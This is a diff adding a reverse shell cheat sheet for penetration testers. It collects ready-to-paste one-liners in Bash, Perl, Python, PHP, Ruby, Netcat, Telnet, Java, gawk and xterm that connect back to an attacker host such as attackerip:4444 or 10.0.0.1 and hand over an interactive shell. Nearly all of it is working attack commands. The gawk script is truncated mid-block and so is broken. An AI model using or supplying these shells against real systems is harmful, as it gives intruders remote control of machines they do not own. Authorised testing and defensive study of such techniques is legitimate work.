@@ -1,0 +1,117 @@
+# Reverse Shell Cheat Sheet
+# Uses info from:
+# http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+# http://bernardodamele.blogspot.com.br/2011/09/reverse-shells-one-liners.html
+# http://www.gnucitizen.org/blog/reverse-shell-with-bash/
+
+If you’re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you’ll probably want an interactive shell.
+
+If it’s not possible to add a new account / SSH key / .rhosts file and just log in, your next step is likely to be either trowing back a reverse shell or binding a shell to a TCP port.  This page deals with the former.
+
+Your options for creating a reverse shell are limited by the scripting languages installed on the target system – though you could probably upload a binary program too if you’re suitably well prepared.
+
+The examples shown are tailored to Unix-like systems.  Some of the examples below should also work on Windows if you use substitute “/bin/sh -i” with “cmd.exe”.
+
+Each of the methods below is aimed to be a one-liner that you can copy/paste.  As such they’re quite short lines, but not very readable.
+
+# Bash
+Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
+
+    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+OR
+    exec /bin/bash 0&0 2>&0
+OR
+    0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196
+OR
+    exec 5<>/dev/tcp/attackerip/4444
+    cat <&5 | while read line; do $line 2>&5 >&5; done  # or:
+    while read line 0<&5; do $line 2>&5 >&5; done
+
+
+# PERL
+Here’s a short, feature-free version that depends on /bin/sh:
+    perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+Shorter Perl reverse shell that does not depend on /bin/sh:
+    perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+If the target system is running Windows use the following one-liner:
+    perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+
+# Python
+This was tested under Linux / Python 2.7:
+    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+# PHP
+This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…
+    php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+
+# Ruby
+Short version that depends on /bin/sh:
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+Longer Ruby reverse shell that does not depend on /bin/sh:
+    ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+If the target system is running Windows use the following one-liner:
+    ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+
+# Netcat
+Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.
+    nc -e /bin/sh 10.0.0.1 1234
+
+If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:
+    rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+
+Others possible Netcat reverse shells, depending on the Netcat version and compilation flags:
+    nc -c /bin/sh attackerip 4444
+OR
+    /bin/sh | nc attackerip 4444
+OR
+    rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/p
+
+
+# Telnet
+Of course, you can also use Telnet as an alternative for Netcat:
+    rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
+Or:
+    telnet attackerip 4444 | /bin/bash | telnet attackerip 4445   # Remember to listen on your machine also on port 4445/tcp
+
+
+# Java
+    r = Runtime.getRuntime()
+    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+    p.waitFor()
+
+
+# gawk
+#!/usr/bin/gawk -f
+
+BEGIN {
+        Port    =       8080
+        Prompt  =       "bkd> "
+
+        Service = "/inet/tcp/" Port "/0/0"
+        while (1) {
+                do {
+                        printf Prompt |& Service
+                        Service |& getline cmd
+                        if (cmd) {
+                                while ((cmd |& getline) > 0)
+                                        print $0 |& Service
+                                close(cmd)
+
+
+# xterm
+One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.
+    xterm -display 10.0.0.1:1
+
+To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):
+    Xnest :1
+
+You’ll need to authorise the target to connect to you (command also run on your host):
+    xhost +targetip
